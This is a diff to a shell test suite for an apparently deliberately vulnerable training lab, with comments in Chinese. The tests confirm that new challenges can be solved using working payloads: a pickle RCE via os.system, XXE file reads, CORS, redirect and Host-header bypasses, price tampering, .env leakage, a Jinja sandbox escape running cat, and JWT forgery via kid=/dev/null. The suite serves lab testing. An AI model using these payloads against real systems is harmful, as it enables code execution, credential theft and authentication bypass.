@@ -42,6 +42,13 @@ check_solved() {
 expect_solved()   { if check_solved "$1"; then ok "$2"; else bad "$2（check() 说 $1 还没通关）"; fi; }
 expect_unsolved() { if check_solved "$1"; then bad "$2（check() 说 $1 已经通关了）"; else ok "$2"; fi; }
 
+# 检查响应头里有没有某个东西（大小写不敏感，因为头部名大小写不固定）
+expect_header() { if printf '%s' "$2" | grep -qi -- "$3"; then ok "$1"; else bad "$1（响应头里没找到 $3）"; fi; }
+expect_no_header() { if printf '%s' "$2" | grep -qi -- "$3"; then bad "$1（响应头里出现了 $3）"; else ok "$1"; fi; }
+
+# 从页面里抠出一个绝对路径 —— 别在断言里硬编码，页面上那条线断了要能发现
+page_path() { printf '%s' "$1" | grep -oE "/[^ <>\"]*$2" | head -n1; }
+
 # 比较浮点数（时间盲注那一题要用）
 expect_lt() { if awk "BEGIN{exit !($2 < $3)}"; then ok "$1（$2 秒）"; else bad "$1（$2 秒，期望小于 $3）"; fi; }
 expect_ge() { if awk "BEGIN{exit !($2 >= $3)}"; then ok "$1（$2 秒）"; else bad "$1（$2 秒，期望至少 $3）"; fi; }
@@ -918,6 +925,69 @@ PY
 )
 expect_has "代码和文档里没有表情符号" "EMOJI_COUNT=0" "$hygiene"
 
+# 中文文案里混用 ASCII 双引号会把 Python 字符串截断。这个坑反复踩过好几次，
+# 而报错行号常常差得老远（Python 会把整段当成一个跨行错误），所以专门查一遍。
+# 指纹：Python 3 里中文是合法的标识符字符，被截断之后残余那截会变成 NAME token。
+quotes=$(python3 - <<'PY'
+import io, pathlib, re, sys, tokenize
+
+PREFIX = re.compile(r'^([rRbBuUfF]{0,3})("""|\'\'\'|"|\')')
+CJK = re.compile(r"[\u3000-\u303f\u4e00-\u9fff\uff00-\uffef]")
+
+hits = []
+for path in sorted(pathlib.Path(".").rglob("*.py")):
+    rel = path.as_posix()
+    if any(part in rel for part in (".git/", "__pycache__/", "workspace/")):
+        continue
+    src = path.read_text(encoding="utf-8")
+    try:
+        toks = list(tokenize.generate_tokens(io.StringIO(src).readline))
+    except Exception:
+        continue
+    for tok in toks:
+        if tok.type == tokenize.NAME and CJK.search(tok.string):
+            hits.append("%s:%d" % (rel, tok.start[0]))
+            continue
+        if tok.type != tokenize.STRING:
+            continue
+        m = PREFIX.match(tok.string)
+        if not m:
+            continue
+        prefix, quote = m.group(1), m.group(2)
+        if len(quote) == 3 or quote != '"' or "r" in prefix.lower():
+            continue
+        body = tok.string[m.end():-1]
+        if '"' in body.replace('\\"', "").replace("\\\\", ""):
+            hits.append("%s:%d" % (rel, tok.start[0]))
+
+print("QUOTE_COUNT=%d" % len(hits))
+for item in hits[:8]:
+    print("  " + item)
+PY
+)
+expect_has "中文文案里没有混用 ASCII 双引号" "QUOTE_COUNT=0" "$quotes"
+
+# 模板是 HTML，Markdown 的 **加粗** 不会渲染 —— 浏览器会原样显示星号。
+bold=$(python3 - <<'PY'
+import pathlib, re
+
+PATTERN = re.compile(r"\*\*([^*\n]+)\*\*")
+hits = []
+for path in sorted(pathlib.Path(".").rglob("*.html")):
+    rel = path.as_posix()
+    if any(part in rel for part in (".git/", "__pycache__/", "workspace/")):
+        continue
+    for lineno, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
+        if PATTERN.search(line):
+            hits.append("%s:%d" % (rel, lineno))
+
+print("BOLD_COUNT=%d" % len(hits))
+for item in hits[:8]:
+    print("  " + item)
+PY
+)
+expect_has "模板里没有漏掉的 Markdown 加粗" "BOLD_COUNT=0" "$bold"
+
 # 面向别人的文档里不该出现内网地址、明文口令这类只属于某一套环境的信息。
 # （靶场题目内容里的假内网地址是有意为之，所以这里只扫 README 和 docs/。）
 leak=$(python3 - <<'PY'
@@ -1316,6 +1386,299 @@ for host in 2130706433 0x7f000001 017700000001 127.1 0 "[::ffff:7f00:1]"; do
   fi
 done
 expect_solved "ssrf/ip_format_filter" "check() 确认内网后台被访问到"
+
+step "15. 新领域的题：反序列化 / XXE / CORS / 开放重定向 / Host 头 / 业务逻辑 / 信息泄露 / 沙箱 / kid"
+
+# ---- deserialization/pickle_cookie：Cookie 里的 pickle
+expect_unsolved "deserialization/pickle_cookie" "动手之前 check() 说未通关"
+
+body=$(page -X POST "$BASE/v/deserialization/pickle_cookie/" \
+  --data-urlencode "user=alice" --data-urlencode "password=alice123")
+expect_has "登录成功、页面显示默认偏好" "light" "$body"
+
+body=$(page -X POST "$BASE/v/deserialization/pickle_cookie/" \
+  --data-urlencode "user=alice" --data-urlencode "password=alice123" \
+  --data-urlencode "prefs=bm90LWEtcGlja2xl")
+expect_has "非法 pickle 会报错（说明服务端真的在解它）" "反序列化这一步出错了" "$body"
+
+# proof.txt 的完整路径从页面里读
+pc_page=$(page "$BASE/v/deserialization/pickle_cookie/")
+proof_path=$(page_path "$pc_page" "proof\.txt")
+if [ -n "$proof_path" ]; then
+  ok "从页面里读到了 proof.txt 的路径（$proof_path）"
+else
+  bad "页面里找不到 proof.txt 的路径"
+fi
+
+cat > /tmp/v4a-pickle.py <<'PYEOF'
+import base64, os, pickle, sys
+
+class Evil:
+    def __reduce__(self):
+        return (os.system, ("echo PICKLE-RCE-OK > " + sys.argv[1],))
+
+sys.stdout.write(base64.b64encode(pickle.dumps(Evil())).decode())
+PYEOF
+blob=$(python3 /tmp/v4a-pickle.py "$proof_path")
+
+code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/v/deserialization/pickle_cookie/" \
+  --data-urlencode "user=alice" --data-urlencode "password=alice123" \
+  --data-urlencode "prefs=$blob")
+expect_code "带恶意 pickle 的请求被正常处理" "$code" "200"
+expect_solved "deserialization/pickle_cookie" "check() 确认 proof.txt 被写出来了"
+body=$(page "$BASE/v/deserialization/pickle_cookie/")
+expect_has "页面把 proof.txt 的内容显示出来了" "PICKLE-RCE-OK" "$body"
+rm -f /tmp/v4a-pickle.py
+
+# ---- xxe/svg_preview：外部实体读文件
+expect_unsolved "xxe/svg_preview" "动手之前 check() 说未通关"
+
+printf '%s' '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><title>正常图标</title><author>alice</author></svg>' > /tmp/v4a-ok.svg
+body=$(page -X POST "$BASE/v/xxe/svg_preview/" -F "icon=@/tmp/v4a-ok.svg;type=image/svg+xml")
+expect_has "正常 SVG 的 title 被提取出来" "正常图标" "$body"
+
+body=$(page -X POST "$BASE/v/xxe/svg_preview/" -F "icon=@/tmp/nonexistent.svg;type=image/svg+xml" 2>/dev/null)
+expect_code "缺文件时接口不崩" \
+  "$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/v/xxe/svg_preview/")" "200"
+
+xxe_page=$(page "$BASE/v/xxe/svg_preview/")
+xxe_secret=$(page_path "$xxe_page" "ops-token\.txt")
+if [ -n "$xxe_secret" ]; then
+  ok "从页面里读到了目标文件路径（$xxe_secret）"
+else
+  bad "页面里找不到目标文件路径"
+fi
+
+cat > /tmp/v4a-xxe.svg <<SVGEOF
+<?xml version="1.0"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file://$xxe_secret"> ]>
+<svg xmlns="http://www.w3.org/2000/svg"><title>&xxe;</title><author>t</author></svg>
+SVGEOF
+body=$(page -X POST "$BASE/v/xxe/svg_preview/" -F "icon=@/tmp/v4a-xxe.svg;type=image/svg+xml")
+expect_has "外部实体把目标文件读出来了" "ICON-OPS-a17f4e" "$body"
+expect_solved "xxe/svg_preview" "check() 确认 XXE 通关"
+
+# 读设备文件不能把 worker 挂住：resolveEntity 用的是 read(MAX_EXPANDED)，有上限。
+# （同类的坑在 path_traversal/encoding_filter 也踩过一次。）
+cat > /tmp/v4a-xxe-zero.svg <<'SVGEOF'
+<?xml version="1.0"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///dev/zero"> ]>
+<svg xmlns="http://www.w3.org/2000/svg"><title>&xxe;</title></svg>
+SVGEOF
+t_zero=$(curl -s -o /dev/null -w '%{time_total}' -X POST "$BASE/v/xxe/svg_preview/" \
+  -F "icon=@/tmp/v4a-xxe-zero.svg;type=image/svg+xml")
+expect_lt "读 /dev/zero 不会挂住（read 有上限）" "$t_zero" "5"
+rm -f /tmp/v4a-ok.svg /tmp/v4a-xxe.svg /tmp/v4a-xxe-zero.svg
+
+# ---- cors/credentials：反射 Origin + 允许凭据
+expect_unsolved "cors/credentials" "动手之前 check() 说未通关"
+
+curl -s -o /dev/null -c "$JAR" -X POST "$BASE/v/cors/credentials/login" \
+  --data-urlencode "user=alice" --data-urlencode "password=alice123"
+
+cors_h=$(curl -s -D - -o /dev/null -b "$JAR" -H "Origin: https://evil.example" \
+  "$BASE/v/cors/credentials/api/me")
+expect_no_header "裸的站外 Origin 被拒（没有 CORS 头）" "$cors_h" "access-control-allow-origin"
+
+cors_h=$(curl -s -D - -o /dev/null -b "$JAR" -H "Origin: https://partner.example" \
+  "$BASE/v/cors/credentials/api/me")
+expect_header "合法合作方被放行" "$cors_h" "access-control-allow-origin: https://partner.example"
+expect_header "而且它允许带凭据" "$cors_h" "access-control-allow-credentials: true"
+
+# 合法合作方确实能读到用户数据（顺带确认 login 那条线是通的）
+cors_body=$(curl -s -b "$JAR" -H "Origin: https://partner.example" \
+  "$BASE/v/cors/credentials/api/me")
+expect_has "合法合作方读到了用户数据" "PA-APIKEY-3f91bd" "$cors_body"
+expect_unsolved "cors/credentials" "合法合作方拿到数据不算打穿"
+
+cors_h=$(curl -s -D - -o /dev/null -b "$JAR" \
+  -H "Origin: https://partner.example.evil.example" "$BASE/v/cors/credentials/api/me")
+expect_header "子串匹配被绕过：非合作方也拿到了 ACAO" "$cors_h" \
+  "access-control-allow-origin: https://partner.example.evil.example"
+expect_solved "cors/credentials" "check() 确认非合作方拿到了带凭据的放行"
+rm -f "$JAR"
+
+# ---- open_redirect/login_next：协议相对 URL 与域名子串
+expect_unsolved "open_redirect/login_next" "动手之前 check() 说未通关"
+
+body=$(page -X POST "$BASE/v/open_redirect/login_next/login" \
+  --data-urlencode "user=alice" --data-urlencode "password=alice123" \
+  --data-urlencode "next=https://evil.example/x")
+expect_has "明文站外地址被拦下" "被拦下了" "$body"
+
+# 正常路径：站内相对路径要能跳
+loc=$(curl -s -D - -o /dev/null -X POST "$BASE/v/open_redirect/login_next/login" \
+  --data-urlencode "user=alice" --data-urlencode "password=alice123" \
+  --data-urlencode "next=/home" | grep -i '^location:' | tr -d '\r')
+expect_has "站内路径正常跳转" "/home" "$loc"
+expect_unsolved "open_redirect/login_next" "站内跳转不算打穿"
+
+loc=$(curl -s -D - -o /dev/null -X POST "$BASE/v/open_redirect/login_next/login" \
+  --data-urlencode "user=alice" --data-urlencode "password=alice123" \
+  --data-urlencode "next=//evil.example/x" | grep -i '^location:' | tr -d '\r')
+expect_has "协议相对 URL 绕过了校验" "//evil.example/x" "$loc"
+
+loc=$(curl -s -D - -o /dev/null -X POST "$BASE/v/open_redirect/login_next/login" \
+  --data-urlencode "user=alice" --data-urlencode "password=alice123" \
+  --data-urlencode "next=https://vuln4all.local.evil.example/" \
+  | grep -i '^location:' | tr -d '\r')
+expect_has "域名子串匹配也被绕过" "vuln4all.local.evil.example" "$loc"
+expect_solved "open_redirect/login_next" "check() 确认跳到了站外"
+
+# ---- host_header/password_reset：重置链接里的域名
+expect_unsolved "host_header/password_reset" "动手之前 check() 说未通关"
+
+body=$(page -X POST "$BASE/v/host_header/password_reset/forgot" \
+  --data-urlencode "email=alice@corp.example")
+expect_has "正常情况下生成的是本站链接" "http://127.0.0.1:${PORT}/reset?token=" "$body"
+expect_unsolved "host_header/password_reset" "本站域名不算打穿"
+
+body=$(page -X POST -H "Host: evil.example" "$BASE/v/host_header/password_reset/forgot" \
+  --data-urlencode "email=alice@corp.example")
+expect_has "裸的站外域名被白名单拦下" "不被允许" "$body"
+
+# 子串匹配的绕过：受信列表里提到 "127.0.0.1" 就算自家
+body=$(page -X POST -H "Host: 127.0.0.1.evil.example" \
+  "$BASE/v/host_header/password_reset/forgot" \
+  --data-urlencode "email=alice@corp.example")
+expect_has "受信主机的子串匹配被绕过" "127.0.0.1.evil.example" "$body"
+expect_solved "host_header/password_reset" "check() 确认生成了站外链接"
+
+# X-Forwarded-Host 是同一个洞的另一条腿
+curl -s -o /dev/null -X POST "$BASE/__vuln4all/reset" \
+  --data-urlencode "id=host_header/password_reset" --data-urlencode "next=/"
+expect_unsolved "host_header/password_reset" "reset 之后回到未通关"
+body=$(page -X POST -H "X-Forwarded-Host: 127.0.0.1.evil.example" \
+  "$BASE/v/host_header/password_reset/forgot" \
+  --data-urlencode "email=alice@corp.example")
+expect_has "X-Forwarded-Host 那条腿也能走通" "127.0.0.1.evil.example" "$body"
+expect_solved "host_header/password_reset" "check() 确认 X-Forwarded-Host 也算"
+
+# ---- business_logic/price_tamper：价格由客户端说了算
+expect_unsolved "business_logic/price_tamper" "动手之前 check() 说未通关"
+
+body=$(page -X POST "$BASE/v/business_logic/price_tamper/order" \
+  --data-urlencode "item=chair" --data-urlencode "price=1888.00" --data-urlencode "qty=1")
+expect_has "按标价下单，订单成立" "1888.00" "$body"
+expect_unsolved "business_logic/price_tamper" "按标价下单不算篡改"
+
+body=$(page -X POST "$BASE/v/business_logic/price_tamper/order" \
+  --data-urlencode "item=chair" --data-urlencode "price=0.01" --data-urlencode "qty=1")
+expect_has "改单价之后实付变成 0.01" "0.01" "$body"
+expect_solved "business_logic/price_tamper" "check() 确认实付低于标价"
+
+# 数量为负是同一个洞的另一种用法，单独验一遍
+curl -s -o /dev/null -X POST "$BASE/__vuln4all/reset" \
+  --data-urlencode "id=business_logic/price_tamper" --data-urlencode "next=/"
+expect_unsolved "business_logic/price_tamper" "reset 之后回到未通关"
+curl -s -o /dev/null -X POST "$BASE/v/business_logic/price_tamper/order" \
+  --data-urlencode "item=chair" --data-urlencode "price=1888.00" --data-urlencode "qty=-5"
+expect_solved "business_logic/price_tamper" "数量改成负数同样算通关"
+
+# ---- info_leak/backup_files：根目录里的残留文件
+expect_unsolved "info_leak/backup_files" "动手之前 check() 说未通关"
+
+body=$(page "$BASE/v/info_leak/backup_files/files/style.css")
+expect_has "公开文件正常能取" "font-family" "$body"
+
+body=$(page "$BASE/v/info_leak/backup_files/files/..%2f..%2fetc%2fpasswd")
+expect_has "路径穿越被拦（这一题特意拦了，好跟穿越题区分）" "越出了站点根目录" "$body"
+
+body=$(page "$BASE/v/info_leak/backup_files/files/.env")
+expect_has "根目录里的 .env 被直接发出来了" "ADMIN-LEAK-5c8e" "$body"
+expect_unsolved "info_leak/backup_files" "拿到文件了但还没登录"
+
+body=$(page "$BASE/v/info_leak/backup_files/files/.git/config")
+expect_has ".git/config 也在（能看出远程地址）" "git.corp.example" "$body"
+
+code=$(curl -s -o /dev/null -w '%{http_code}' -X POST \
+  "$BASE/v/info_leak/backup_files/admin/login" \
+  --data-urlencode "password=ADMIN-LEAK-5c8e")
+expect_code "用泄露出来的口令登录" "$code" "200"
+expect_solved "info_leak/backup_files" "check() 确认两个目标都达成"
+
+# ---- ssti/sandbox_escape：自己放宽的沙箱
+expect_unsolved "ssti/sandbox_escape" "动手之前 check() 说未通关"
+
+body=$(page -X POST "$BASE/v/ssti/sandbox_escape/" \
+  --data-urlencode "template=你好 {{ user.name }}")
+expect_has "正常模板渲染" "你好 alice" "$body"
+
+body=$(page -X POST "$BASE/v/ssti/sandbox_escape/" \
+  --data-urlencode "template={{ ''.__class__.__subclasses__() }}")
+expect_has "被拉黑的名字被沙箱拦住" "SecurityError" "$body"
+
+body=$(page -X POST "$BASE/v/ssti/sandbox_escape/" \
+  --data-urlencode "template={{ lipsum.__globals__ }}")
+expect_unsolved "ssti/sandbox_escape" "被拉黑的名字不算通关"
+
+se_page=$(page "$BASE/v/ssti/sandbox_escape/")
+se_secret=$(page_path "$se_page" "ops-token\.txt")
+if [ -n "$se_secret" ]; then
+  ok "从页面里读到了目标文件路径（$se_secret）"
+else
+  bad "页面里找不到目标文件路径"
+fi
+
+ssti_payload="{{ lipsum.__getattribute__('__globals__')['os'].popen('cat ${se_secret}').read() }}"
+body=$(page -X POST "$BASE/v/ssti/sandbox_escape/" --data-urlencode "template=$ssti_payload")
+expect_has "用 __getattribute__ 绕过沙箱读到了凭据" "WELCOME-OPS-2d6b93" "$body"
+expect_solved "ssti/sandbox_escape" "check() 确认沙箱被绕过"
+
+# ---- jwt/kid_injection：验签密钥由 token 自己指定
+expect_unsolved "jwt/kid_injection" "动手之前 check() 说未通关"
+
+code=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/v/jwt/kid_injection/api/me")
+expect_code "没有 token → 401" "$code" "401"
+
+# 正常路径：登录拿到的 token 必须能过。
+# （这一条是补上的 —— 之前只测了"错密钥被拒"和"/dev/null 通过"，
+#   结果漏掉了"load_key 用相对路径导致正常 token 也验不过"这个 bug。）
+jwt_login=$(page -X POST "$BASE/v/jwt/kid_injection/login" \
+  --data-urlencode "user=alice" --data-urlencode "password=alice123")
+good=$(printf '%s' "$jwt_login" | grep -oE 'eyJ[A-Za-z0-9_.-]+' | head -n1)
+if [ -n "$good" ]; then
+  ok "页面里给出了登录签发的 token"
+else
+  bad "登录之后页面上没有 token"
+fi
+code=$(curl -s -o /tmp/v4a-jwt-user.json -w '%{http_code}' \
+  -H "Authorization: Bearer $good" "$BASE/v/jwt/kid_injection/api/me")
+expect_code "正常签发的 token 能通过鉴权" "$code" "200"
+# 注意 jsonify 默认把非 ASCII 转义成 \uXXXX，所以断言只挑 ASCII 字段名
+expect_has "返回体里带着角色字段" '"role"' "$(cat /tmp/v4a-jwt-user.json)"
+expect_no "普通用户看不到 admin 那块数据" "ADMIN-AREA-7c4f" "$(cat /tmp/v4a-jwt-user.json)"
+expect_unsolved "jwt/kid_injection" "普通用户的 token 不算打穿"
+rm -f /tmp/v4a-jwt-user.json
+
+cat > /tmp/v4a-jwt.py <<'PYEOF'
+import base64, hashlib, hmac, json, sys
+
+def b64e(raw):
+    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
+
+kid, key = sys.argv[1], sys.argv[2].encode()
+header = {"alg": "HS256", "typ": "JWT", "kid": kid}
+payload = {"user": "alice", "role": "admin"}
+head = b64e(json.dumps(header, separators=(",", ":")).encode())
+body = b64e(json.dumps(payload, separators=(",", ":")).encode())
+mac = hmac.new(key, ("%s.%s" % (head, body)).encode(), hashlib.sha256).digest()
+sys.stdout.write("%s.%s.%s" % (head, body, b64e(mac)))
+PYEOF
+
+bad_token=$(python3 /tmp/v4a-jwt.py "rotate-2026.key" "wrong-key")
+code=$(curl -s -o /dev/null -w '%{http_code}' \
+  -H "Authorization: Bearer $bad_token" "$BASE/v/jwt/kid_injection/api/me")
+expect_code "用错密钥签的 token 被拒" "$code" "401"
+expect_unsolved "jwt/kid_injection" "错密钥不算通关"
+
+good_token=$(python3 /tmp/v4a-jwt.py "/dev/null" "")
+code=$(curl -s -o /tmp/v4a-jwt-out.json -w '%{http_code}' \
+  -H "Authorization: Bearer $good_token" "$BASE/v/jwt/kid_injection/api/me")
+expect_code "kid=/dev/null 让服务端用空密钥验签 —— 伪造的 token 通过了" "$code" "200"
+expect_has "拿到了 admin 数据" "ADMIN-AREA-7c4f" "$(cat /tmp/v4a-jwt-out.json)"
+expect_solved "jwt/kid_injection" "check() 确认 kid 注入通关"
+rm -f /tmp/v4a-jwt.py /tmp/v4a-jwt-out.json
 
 step "结果"
 printf '  通过 %d 项，失败 %d 项\n' "$PASS" "$FAIL"
